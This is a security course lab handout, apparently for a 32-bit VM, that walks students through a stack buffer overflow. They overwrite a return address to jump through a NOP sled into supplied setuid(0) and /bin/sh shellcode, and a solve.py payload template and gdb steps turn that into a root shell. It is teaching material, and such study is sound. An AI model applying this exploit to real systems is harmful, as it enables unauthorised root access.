# Level 2 — "NOP Sled" (Medium)

Level 1 corrupted a neighboring variable. Level 2 hijacks **control flow**.

You overflow a stack buffer, overwrite the **saved return address**, and point
it into a long runway of NOP instructions (`\x90`). The CPU slides down the
sled into the **provided shellcode** in `shellcode.py`, which:

1. runs `setuid(0)` (become root if the binary is setuid-root)
2. runs `execve("/bin/sh")` (drop a shell)

**Win condition:** you get a shell where `id` shows `uid=0(root)`.
Before the attack, `id` should show your normal student user — not root.

You do **not** edit `vulnerable.c`. You craft the input payload (and may
copy/adapt the solve template). Use the bytes from `shellcode.py` — do not
hand-write machine code from scratch.

On the course VM, `./vulnerable` is a **setuid-root** binary. That is why
the shellcode’s `setuid(0)` + `/bin/sh` can produce a root shell. Logging
into the VM does **not** make you root.

---

## Why a NOP sled?

Your return-address guess does not need to be *perfect*. If you land anywhere
inside a long sequence of `\x90` (NOP = "do nothing"), the CPU keeps walking
forward until it hits your shellcode. That runway is the **NOP sled**.

```text
buffer (low address) ------> higher addresses ------> saved return addr
[ NOP NOP NOP NOP | shellcode ] .............. [ addr pointing into NOPs ]
         ^                                      |
         +--------------------------------------+
```

---

## Step 1 — Build

```bash
make
file vulnerable      # ELF 32-bit ... Intel 80386
```

This level links with `-z execstack` so the stack is executable (otherwise
injected shellcode cannot run). **Read the compiler warnings.**

Confirm ASLR is off:

```bash
cat /proc/sys/kernel/randomize_va_space   # expect 0
```

## Step 2 — Recon

```bash
./vulnerable
```

Note the printed `[leak] buffer @ 0x........` address. That is where your
NOP sled + shellcode will live. Re-read it each run if addresses move.

Look at the provided shellcode (optional, for curiosity):

```bash
python3 -c 'from shellcode import shellcode; print(len(shellcode), shellcode[:16])'
```

## Step 3 — Find the offset to the return address

You must fill past `buffer[128]` and any saved frame pointer / alignment
padding until you reach the return address.

**Measure on your VM** (do not copy a number from another machine blindly):

```bash
gdb ./vulnerable
(gdb) break vulnerable
(gdb) run
(gdb) print &buffer
(gdb) info frame
```

A common starting guess on `-O0` i386 builds is a bit above `128 + 4`, but
**verify**. If your payload fails, adjust the offset.

## Step 4 — Build the payload with `shellcode.py`

Structure:

1. Many `\x90` NOPs (the sled)
2. `shellcode` from `shellcode.py` (`setuid` + `/bin/sh`)
3. Padding until the return-address slot
4. A 4-byte little-endian address pointing into the middle of your NOP sled
   (leaked buffer address + a small offset into the sled)

Template — save as `solve.py` next to `shellcode.py`:

```python
import sys
import struct
from shellcode import shellcode

buf_addr = 0xREPLACE_ME   # from the [leak] line
offset   = REPLACE_ME     # measured on YOUR vm

nops = b"\x90" * 64
padding = b"A" * (offset - len(nops) - len(shellcode))
ret = struct.pack("<I", buf_addr + 16)  # land mid-sled

sys.stdout.buffer.write(nops + shellcode + padding + ret)
```

Run (keep stdin open so the shell stays interactive):

```bash
(python3 solve.py; cat) | ./vulnerable
```

Then:

```bash
id
whoami
exit
```

## Step 5 — Submit

- Your `solve.py` (or equivalent payload)
- The leaked buffer address and return-address offset you used
- 4–6 sentences: what a NOP sled is, what `shellcode.py` is doing
  (`setuid` + `execve /bin/sh`), and why the stack must be executable

---

## What you should understand after this

- The saved return address controls where the function returns.
- Overwriting it redirects the CPU (control-flow hijack).
- NOPs (`\x90`) buy you tolerance on the landing address.
- Shellcode is just bytes the CPU executes if you point EIP at them.
- NX / non-executable stacks exist to stop this class of attack
  (`-z execstack` turns that protection off for this level only).
- Level 3 will get a shell a different way: jump to an existing function,
  with **no** injected shellcode.
